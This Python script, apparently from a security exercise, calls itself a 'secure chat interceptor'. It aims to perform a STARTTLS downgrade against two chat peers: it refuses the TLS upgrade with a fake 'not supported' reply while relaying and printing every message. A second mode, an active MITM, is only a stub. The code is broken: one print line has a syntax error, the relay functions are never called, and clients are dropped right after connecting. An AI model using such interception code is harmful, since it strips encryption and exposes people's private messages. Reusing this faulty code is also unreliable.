#!/usr/bin/env python3
#Secure chat interceptor
import socket
import sys
import time
from _thread import *
from datetime import datetime
import threading
import subprocess
import argparse
import ssl

PORT = 7129
RECVSIZE = 1024
client_list=[]
client_names=[]

class break_check:
    flag = True

    def set(self):
        self.flag = True
    def unset(self):
        self.flag = False
    def get(self):
        return self.flag

def threaded(name, connection):
    print("Connected with ", name)
    for conn in client_names:
        print("connection in list: ", conn)
    client_names.remove(name)
    client_list.remove((name, connection))
    try:
        connection.shutdown(socket.SHUT_RDWR)
        connection.close()
    except:
        pass

def alice_receiving(conn_alice, conn_bob, tls_check):
    while True:
        msg = conn_alice.recv(RECVSIZE)
        if msg == b'':
            conn_bob.sendall(msg)
            print("socket connection broken")
            return
        msg = msg.decode()
        if msg == 'chat_STARTTLS' and tls_check:
            conn_alice.sendall("chat_STARTTLS_NOT_SUPPORTED".encode())
        
        print("\n{} : {}".format("alice", msg)))
        conn_bob.sendall(msg.encode())
        if msg == 'chat_close':
            break
        
    #sys.exit()

def bob_receiving(conn_bob, conn_alice):
    while True:
        msg = conn_bob.recv(RECVSIZE)
        if msg == b'':
            print("socket connection broken")
            return
        msg = msg.decode()
        print("\n{} : {}".format("bob", msg))
        conn_alice.sendall(msg.encode())
        if msg == 'chat_close':
            #connection.close()
            break


def starttlsdown(peer1, peer2):
    print("Starting STARTTLS downgrade attack over {} and {}".format(peer1, peer2))
    s_socket = socket.socket(socket.AF_INET6,type=socket.SOCK_STREAM)
    s_socket.bind((b'',PORT,0,0))
    print("Server listening on port ",PORT)
    s_socket.listen()

    #peer1
    connection1, address1 = s_socket.accept()
    
    client_list.append((peer1, connection1))
    client_names.append(peer1)

    start_new_thread(threaded, (peer1, connection1))

    #peer2
    connection2, address2 = s_socket.accept()
    
    client_list.append((peer2, connection2))
    client_names.append(peer2)

    start_new_thread(threaded, (peer2, connection2))

    try:
        s_socket.close()
    except:
        pass


def activemitm(peer1, peer2):
    print("Starting Active MITM attack over {} and {}".format(peer1, peer2))


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print("Usage : {0} -d <peer1> <peer2> \n\t{0} -m <peer1> <peer2>".format(sys.argv[0]))
        sys.exit(1)
    if sys.argv[1] == '-d':
        starttlsdown(sys.argv[2], sys.argv[3])
    elif sys.argv[1] == '-m':
        activemitm(sys.argv[2], sys.argv[3])
    else:
        print("Usage : {0} -d <peer1> <peer2> \n\t{0} -m <peer1> <peer2>".format(sys.argv[0]))
        sys.exit(1)
    
    
